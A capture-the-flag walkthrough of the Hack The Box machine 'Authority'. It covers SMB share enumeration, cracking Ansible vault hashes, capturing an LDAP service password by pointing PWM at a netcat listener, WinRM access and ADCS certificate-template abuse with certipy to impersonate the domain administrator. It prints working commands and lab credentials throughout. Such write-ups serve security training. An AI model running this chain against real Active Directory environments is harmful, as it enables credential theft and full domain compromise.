# Box: Authority

> damiano gubiani | 14/11/2025

# Enumeration

lets export the target IP

command:

```bash
export IP='10.10.11.222'
```

## NMAP

running nmap scan to enumerate open ports

command:

```bash
sudo nmap -sS -sC -sV -oN nmap --open -vv -T4 $IP
```

output:

```
Nmap scan report for 10.10.11.222
Host is up, received reset ttl 127 (0.39s latency).
Scanned at 2025-11-14 01:31:14 CST for 173s
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-14 11:32:39Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
|_ssl-date: 2025-11-14T11:34:04+00:00; +4h00m01s from scanner time.
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-11-14T11:34:05+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-11-14T11:34:03+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
|_ssl-date: 2025-11-14T11:34:05+00:00; +4h00m01s from scanner time.
8443/tcp open  ssl/https-alt syn-ack ttl 127
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-12T11:14:42
| Not valid after:  2027-11-14T22:53:06
| MD5:   771c:3280:2487:609b:9da0:5325:0a5e:5035
| SHA-1: 0d85:d76c:ba5c:1c07:ab22:dbbc:ca84:4dc9:c75b:82b7
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Fri, 14 Nov 2025 11:32:50 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Fri, 14 Nov 2025 11:32:45 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Fri, 14 Nov 2025 11:32:47 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Fri, 14 Nov 2025 11:32:57 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
1 service unrecognized despite returning data. If you know the service/version, 
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## SMB

### Enumerating

*SMB* protocol is enabled on the machine , lets list all the available shares

command:

```bash
nxc smb $IP -u guest -p '' --shares
```

output:

![[Pasted image 20251114084516.png]]

guest user have *read* right on the development folder , lets connect to it and check for interesting files inside of it

command:

```bash
smbclient -N  \\\\$IP\\Development
```

while enumerating the directory inside the share folder , i stumbled across some **ansible** encrypted passwords

![[Pasted image 20251114085421.png]]

i parsed the hash in 3 file separetly and used **ansible2john** to extract the hash.

### Password Cracking

i then run hashcat to bruteforce the hash , i found some password

```
$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*

$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*

$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&*
```

searching on the internet i found that we can decrypt this hashes with **ansible-vault** with the decrypt parameter 

so i runned the command decrypt on all hash fies with the found password and this is what i got

```
pWm_@dm!N_!23
DevT3st@123
svc_pwm
```

looking at *nmap scan* on the port 8443 the running service is *pwm* 

when i went to the site i get a login page , lets try the credentials we found

# Exploit

## Enumerating

normal login doesnt work , but when i enter the *pWm_@dm!N_!23* in the configuration manager and we manage to get access to the configuration editor.

![[Pasted image 20251114113640.png]]

after looking around the machine i found an LDAP tester that has for the authentication a username called svc_ldap with a non clear password.

![[Pasted image 20251114120123.png]]

we can modify the ldap urls to trick te system to connect back to us to retrive the password in clear text

![[Pasted image 20251114120006.png]]

i started a listener on my local machine with netcat

```bash
nc -lvp 4444
```

and after starting the test LDAP i got a call back retriving the password for the svc_ldap user

```
CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htbï¿½lDaP_1n_th3_cle4r!
```

# Post

## Enumerating

lets run bloodhound collection to enumerate the database 

command:

```bash
nxc ldap $IP -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --bloodhound --collect all --dns-server $IP 
```

after collecting the data we supply them to the bloodhound software and start enumerating the AD

![[Pasted image 20251114132812.png]]

i found the svc_ldap user is in the remote managment group so i connect to the AD with winrm since the RPC port is open

## WinRM

command:

```bash
evil-winrm -i $IP -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

we got out first flag in the user desktop

### Enumeration

lets check user privilage and groups

![[Pasted image 20251114133654.png]]

checking for the groups the user svc_ldap is in the *Certificate Service* group.

lets run certipy to get a possible vulnerable template to escalate our privilage

# Privilege Escaletion

lets run certipy to check for potential vulnerable template

command:

```bash
certipy find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -vulnerable
```

the output shows that thers a vulnerqable template that can be issued to **AUTHORITY.HTB\\Domain Computers**

![[Pasted image 20251114141303.png]]

first lets check the *Machine Quota*

command:

```bash
nxc ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq
```

output:

![[Pasted image 20251114144635.png]]

lets add a computer to the domain , so we can request a certificate using that machine

command:

```bash
addcomputer.py -computer-name EVIL02 -method LDAPS -computer-pass 'StrongPassword1!' -dc-ip 10.10.11.222 'authority.htb'/'svc_ldap':'lDaP_1n_th3_cle4r!'
```

and then lets request the ticket using the machine we have just added

command:

```bash
certipy req -u'EVIL02$' -p 'StrongPassword1!' -dc-ip 10.10.11.222 -ca AUTHORITY-CA -target 'authority.authority.htb' -template 'CorpVPN' -upn 'administrator@authority.htb'
```

and we got out the administrator certificate